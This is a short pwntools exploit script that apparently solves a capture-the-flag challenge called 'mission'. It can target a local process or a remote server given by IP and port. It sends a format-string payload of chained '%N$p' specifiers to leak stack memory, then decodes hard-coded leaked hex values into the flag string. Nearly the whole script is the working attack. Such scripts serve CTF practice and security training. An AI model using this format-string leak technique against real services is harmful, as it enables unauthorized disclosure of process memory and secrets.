from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./mission"
elf = ELF(vuln_path)
libc = elf.libc



def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()

# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

io = process([vuln_path]) if not f_remote else remote("43.205.113.100", 8834)

io.sendlineafter("find it? (Y/n)", "a")
ddebug("breakrva 0x00131C\ncontinue")
io.sendlineafter("your name again?\n", "%10$p--%11$p--%12$p--%13$p--%14$p--%15$p--%16$p--%17$p--%18$p")
data = io.recv(300)
log.success(data)

a = "0x746369746b616873--0x58655f3368747b66--0x5f64337463407274--0x656974696c696240--0x6873316e40765f35--0x3368745f7475625f--0x33725f67406c665f--0x7d736e31406d--0x252d2d7024303125"
# a = "0x7d736e31406d--0x252d2d7024373125"
cleaned = a.replace("0x", "").split("--")
flag = ""
for i in cleaned:
    byte_data = unhex(i)
    flag += byte_data[::-1].decode("utf-8")
    print(flag)

# io.interactive()


